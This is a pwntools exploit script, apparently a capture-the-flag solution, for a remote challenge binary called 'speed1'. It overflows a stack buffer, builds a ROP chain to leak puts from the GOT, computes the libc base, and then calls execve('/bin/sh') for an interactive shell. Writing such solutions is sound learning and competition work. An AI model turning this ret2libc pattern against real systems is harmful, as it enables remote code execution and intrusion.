# author: express
from pwn import *

elf = ELF("./speed1_patched")
libc = ELF("./libc.so.6")

r = remote("speed-01.hfsc.tf", 61000)

PADDING = b'A'*40

POP_RDI = 0x4012b3
POP_RSI = 0x4012b1
MAIN    = 0x4011cf

r.recv()
r.recv()

first_stage = flat(
        PADDING,
        p64(POP_RDI),
        p64(elf.got.puts),
        p64(elf.plt.puts),
        p64(MAIN)
    )
    
r.sendline(first_stage)

puts_leak = int(bytes.hex(r.recv()[0:6][::-1]), 16)

libc.address = puts_leak - libc.symbols.puts
execve = libc.symbols.execve
exit_func = libc.symbols['exit']
BIN_SH = libc.address + 0x1b45bd

print("puts_leak    @   ", hex(puts_leak))
print("libc_base    @   ", hex(libc.address))
print("execve at    @   ", hex(execve))
print("bin_sh at    @   ", hex(BIN_SH))

second_stage = flat(
        PADDING,
        p64(POP_RDI),
        p64(BIN_SH),
        p64(POP_RSI),
        p64(0x0),
        p64(0x0),
        p64(execve),
        p64(exit_func)
    )
    
r.sendline(second_stage)

r.interactive()
r.close()